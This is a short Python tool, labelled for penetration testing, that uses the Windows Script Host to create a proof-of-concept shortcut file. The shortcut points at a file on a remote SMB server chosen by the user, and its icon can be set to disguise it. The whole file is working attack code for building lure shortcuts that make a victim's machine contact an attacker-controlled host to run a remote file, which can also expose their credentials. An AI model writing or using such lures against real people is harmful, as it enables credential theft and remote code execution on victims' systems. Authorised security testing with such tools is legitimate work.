import os
import pythoncom
from win32com.client import Dispatch

class LnkCreator:
    """
    LnkShortcutTool - LNK Shortcut Creator for penetration testing purposes.
    Author: Security Research Team
    Version: 1.0
    """

    def __init__(self):
        self.version = "1.0"
        self.author = "Security Research Team"
        self.description = "LNK shortcut creation tool for penetration testing."

    def create_shortcut(self, save_path: str, server_ip: str, share_name: str, target_file: str, icon_path: str = None):
        """
        Create a LNK shortcut pointing to a remote SMB server.

        Args:
            save_path (str): Local path to save the shortcut.
            server_ip (str): SMB server IP or domain.
            share_name (str): Shared folder name.
            target_file (str): File name on SMB server.
            icon_path (str, optional): Path to icon file.

        Returns:
            tuple(bool, str): (Success flag, Message)
        """
        try:
            shortcut_path = os.path.join(save_path, "poc.lnk")
            target_path = f"\\\\{server_ip}\\{share_name}\\{target_file}"
            icon_location = icon_path if icon_path else r"C:\Windows\System32\SHELL32.dll"

            pythoncom.CoInitialize()
            shell = Dispatch("WScript.Shell")
            shortcut = shell.CreateShortcut(shortcut_path)
            shortcut.TargetPath = target_path
            shortcut.IconLocation = icon_location
            shortcut.Save()

            return True, f"Shortcut created successfully:\n{shortcut_path}\nTarget:\n{target_path}"

        except Exception as e:
            return False, f"Error occurred: {str(e)}"
        finally:
            pythoncom.CoUninitialize()
